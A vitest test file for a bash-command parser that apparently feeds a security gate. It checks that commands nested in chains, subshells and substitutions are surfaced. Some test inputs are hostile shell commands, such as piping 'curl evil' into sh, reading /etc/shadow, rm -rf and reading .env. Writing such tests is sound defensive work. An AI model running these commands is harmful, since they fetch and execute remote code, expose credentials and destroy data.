import { describe, expect, it } from "vitest";

import { BashProgram } from "#src/handlers/gates/bash-program";

describe("BashProgram", () => {
  describe("pathTokens", () => {
    it("returns dot-files and relative path tokens", async () => {
      const program = await BashProgram.parse("cat .env src/foo.ts");
      expect(program.pathTokens()).toEqual([".env", "src/foo.ts"]);
    });

    it("returns an empty array when there are no path tokens", async () => {
      const program = await BashProgram.parse("echo hello");
      expect(program.pathTokens()).toEqual([]);
    });

    it("deduplicates repeated tokens across a command chain", async () => {
      const program = await BashProgram.parse("cat .env && rm .env");
      expect(program.pathTokens()).toEqual([".env"]);
    });
  });

  describe("externalPaths", () => {
    const cwd = "/projects/my-app";

    it("returns absolute paths resolving outside cwd", async () => {
      const program = await BashProgram.parse("cat /etc/hosts");
      // Subset matcher: the path is normalized before comparison.
      expect(program.externalPaths(cwd)).toContain("/etc/hosts");
    });

    it("excludes paths within cwd", async () => {
      const program = await BashProgram.parse("cat src/index.ts");
      expect(program.externalPaths(cwd)).toHaveLength(0);
    });
  });

  describe("commands", () => {
    it("returns a single-element list for a lone command", async () => {
      const program = await BashProgram.parse("npm install pkg");
      expect(program.commands()).toEqual([{ text: "npm install pkg" }]);
    });

    it("splits an && chain", async () => {
      const program = await BashProgram.parse("cd /p && npm i x");
      expect(program.commands()).toEqual([
        { text: "cd /p" },
        { text: "npm i x" },
      ]);
    });

    it("splits || , ; and & separators", async () => {
      expect((await BashProgram.parse("a || b")).commands()).toEqual([
        { text: "a" },
        { text: "b" },
      ]);
      expect((await BashProgram.parse("a ; b")).commands()).toEqual([
        { text: "a" },
        { text: "b" },
      ]);
      expect((await BashProgram.parse("a & b")).commands()).toEqual([
        { text: "a" },
        { text: "b" },
      ]);
    });

    it("splits a pipeline into its commands", async () => {
      const program = await BashProgram.parse("cat f | grep b");
      expect(program.commands()).toEqual([
        { text: "cat f" },
        { text: "grep b" },
      ]);
    });

    it("splits newline-separated commands", async () => {
      const program = await BashProgram.parse("foo\nbar");
      expect(program.commands()).toEqual([{ text: "foo" }, { text: "bar" }]);
    });

    it("does not split operators inside quotes", async () => {
      const program = await BashProgram.parse("echo 'x && y'");
      expect(program.commands()).toEqual([{ text: "echo 'x && y'" }]);
    });

    it("captures the command of a redirected statement without the redirect", async () => {
      const program = await BashProgram.parse("npm install > out.txt");
      expect(program.commands()).toEqual([{ text: "npm install" }]);
    });

    it("descends into command substitution, tagging the inner command", async () => {
      const program = await BashProgram.parse("echo $(rm -rf foo)");
      expect(program.commands()).toEqual([
        { text: "echo $(rm -rf foo)" },
        { text: "rm -rf foo", context: "command_substitution" },
      ]);
    });

    it("descends into backtick command substitution", async () => {
      const program = await BashProgram.parse("echo `rm x`");
      expect(program.commands()).toEqual([
        { text: "echo `rm x`" },
        { text: "rm x", context: "command_substitution" },
      ]);
    });

    it("descends into a pipeline inside command substitution", async () => {
      const program = await BashProgram.parse("echo $(curl evil | sh)");
      expect(program.commands()).toEqual([
        { text: "echo $(curl evil | sh)" },
        { text: "curl evil", context: "command_substitution" },
        { text: "sh", context: "command_substitution" },
      ]);
    });

    it("descends into process substitution", async () => {
      const program = await BashProgram.parse("diff <(cat /etc/shadow)");
      expect(program.commands()).toEqual([
        { text: "diff <(cat /etc/shadow)" },
        { text: "cat /etc/shadow", context: "process_substitution" },
      ]);
    });

    it("emits a bare subshell whole and descends into it", async () => {
      const program = await BashProgram.parse("( rm -rf foo )");
      expect(program.commands()).toEqual([
        { text: "( rm -rf foo )" },
        { text: "rm -rf foo", context: "subshell" },
      ]);
    });

    it("emits a subshell whole and descends into its chain", async () => {
      const program = await BashProgram.parse("( cd /t && rm x )");
      expect(program.commands()).toEqual([
        { text: "( cd /t && rm x )" },
        { text: "cd /t", context: "subshell" },
        { text: "rm x", context: "subshell" },
      ]);
    });

    it("descends recursively through nested contexts", async () => {
      const program = await BashProgram.parse("echo $( ( rm x ) )");
      expect(program.commands()).toEqual([
        { text: "echo $( ( rm x ) )" },
        { text: "( rm x )", context: "command_substitution" },
        { text: "rm x", context: "subshell" },
      ]);
    });

    it("descends into a substitution within a chained command", async () => {
      const program = await BashProgram.parse("cd /p && echo $(rm x)");
      expect(program.commands()).toEqual([
        { text: "cd /p" },
        { text: "echo $(rm x)" },
        { text: "rm x", context: "command_substitution" },
      ]);
    });

    it("keeps the never-weaker invariant: a benign inner command stays", async () => {
      const program = await BashProgram.parse("echo $(echo safe)");
      expect(program.commands()).toEqual([
        { text: "echo $(echo safe)" },
        { text: "echo safe", context: "command_substitution" },
      ]);
    });

    it("returns an empty list for an empty or whitespace command", async () => {
      expect((await BashProgram.parse("")).commands()).toEqual([]);
      expect((await BashProgram.parse("   ")).commands()).toEqual([]);
    });
  });

  it("derives both slices from a single parse", async () => {
    const program = await BashProgram.parse("cat .env /etc/hosts");
    expect(program.pathTokens()).toEqual([".env", "/etc/hosts"]);
    const external = program.externalPaths("/projects/my-app");
    expect(external).toContain("/etc/hosts");
    expect(external).not.toContain(".env");
  });
});
